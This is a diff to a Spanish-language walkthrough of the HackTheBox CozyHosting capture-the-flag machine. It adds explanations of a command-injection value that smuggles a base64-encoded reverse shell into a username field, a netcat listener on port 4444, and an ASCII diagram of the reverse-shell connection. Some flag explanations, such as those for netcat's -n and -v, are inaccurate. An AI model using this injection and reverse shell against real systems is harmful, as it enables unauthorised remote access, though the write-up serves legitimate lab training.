@@ -1,8 +1,10 @@
 # Guía de CozyHosting
 ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/435b71f8-991f-49d3-a522-834223f67536)
 
-En este repositorio, buscamos explicar paso a paso la búsqueda de la bandera. He creado esto para las personas nuevas en el mundo del hacking ético para que no se sientan abrumadas por tantos conceptos. Hay varios conceptos importantes y herramientas que son muy útiles.
+En este repositorio, buscamos explicar paso a paso la búsqueda de las banderas del reto CozyHosting de HackTheBox. 
+He creado esto para las personas nuevas en el mundo del hacking ético para que no se sientan abrumadas por tantos conceptos. Hay varios conceptos importantes y herramientas que son muy útiles.
 
+Dentro del rato sabemos que hay dos banderas. La primera esta en usario y la segunda en root. Esta es la unica informacion que tenemos.
 Lo primero que haremos es identificar la máquina que querremos atacar, que en este caso es CozyHosting. Esta tiene la siguiente información:
 
 - **IP: 10.10.11.230**
@@ -200,7 +202,15 @@ Copiamos todo el resultado y lo insertamos en la siguiente cadena:
 ```
 kanderson;echo${IFS}"ELNUMEROQUETEDIO_NOBORRESLASCOMILLAS"|base64${IFS}-d|bash;
 ```
+- echo se utiliza para imprimir texto en la salida estándar.
 
+- ${<IFS} representa un espacio en blanco o un carácter de espacio en blanco, que se usa para separar elementos en un comando.
+- | se utiliza para redirigir la salida del comando anterior a la entrada del siguiente comando.
+- base64${IFS}-d se utiliza para decodificar una cadena en formato Base64. Esto podría ser para decodificar el número de puerto y la dirección IP proporcionados entre las comillas.
+- | nuevamente redirige la salida.
+- bash; ejecuta un intérprete de comandos Bash para ejecutar comandos adicionales.
+
+- "ELNUMEROQUETEDIO_NOBORRESLASCOMILLAS" es un marcador para que el usuario ingrese su propia dirección IP y número de puerto entre las comillas. Esto se usa para que el atacante pueda especificar la dirección IP y el puerto al que se conectará el sistema comprometido.
 Luego, pegamos esta cadena en Burp Suite.
 
 ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c707a2c2-1b47-4c57-9908-be49db5042ef)
@@ -210,6 +220,7 @@ Enviamos la solicitud y abrimos una terminal en nuestro sistema con el siguiente
 ```
 nc -lnvp 4444
 ```
+- nc -lnvp 4444 - Este comando escucha el puerto (4444) utilizando netcat (nc) en modo de escucha (-l) y con opción de conexión persistente (-n y -v) para permitir que el atacante se conecte al sistema comprometido.
 
 Si todo ha salido bien, deberíamos ver algo como esto:
 
@@ -218,6 +229,37 @@ Si todo ha salido bien, deberíamos ver algo como esto:
 Podemos verificar los archivos disponibles utilizando el comando `ls`. Observamos que hay un archivo Jar.
 
 *Nota: El puerto puede variar según las preferencias del usuario y lo que se descubra durante el proceso.*
+
+
+-Les adjunto un digrama del proceso
++-------------------+           +----------------------+
+| Tu Máquina        |           | Sistema Objetivo     |
+| (Tu IP)           |           |                      |
++-------------------+           +----------------------+
+       ↓|↑                            |↓
+       ↓|↑                           ↑|
+       ↓|↑                            |↓
+       ↓|↑                           ↑|
+       ↓|   +---------------------------------+
+       ↓|   | Comando de Shell Inverso        |
+       ↓|   |                                 |
+       ↓| --> kanderson;                      |
+       ↓|   | echo${IFS}"ELNUMEROQUETEDIO_... | 
+       ↓|   +---------------------------------+
+       ↓|↑                            |
+       ↓|↑                           ↑|
+       ↓|↑                            |↓
+       ↓|↑                           ↑|
+       ↓|↑                            |↓
+       ↓|↑                           ↑|
+       ↓|↑                            |↓
+       ↓|   +-------------------+    ↑|
+       ↓|↑  |                   |     |↓
+        --->  Conexión de Shell Inverso  
+            |                   |
+            | nc -lnvp 4444     |
+            +-------------------+
+
 
 Siguiendo estos pasos, podemos realizar una inyección de shell o shell reverso para acceder al sistema de destino de manera efectiva.
 
@@ -262,7 +304,7 @@ Ahora, continuemos con el proceso:
 
    ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/aaf2119a-0852-46a7-8f8d-090705b21995)
 
-   *Ten en cuenta que puede haber más archivos, pero lo importante son las carpetas.*
+   *Ten en cuenta que puede haber más archivos, pero lo importante son las carpetas.Yo tengo varios Cloudhosting.jar porque lo hice varias veces*
 
 4. A continuación, revisamos los archivos buscando usuarios utilizando el siguiente comando:
 
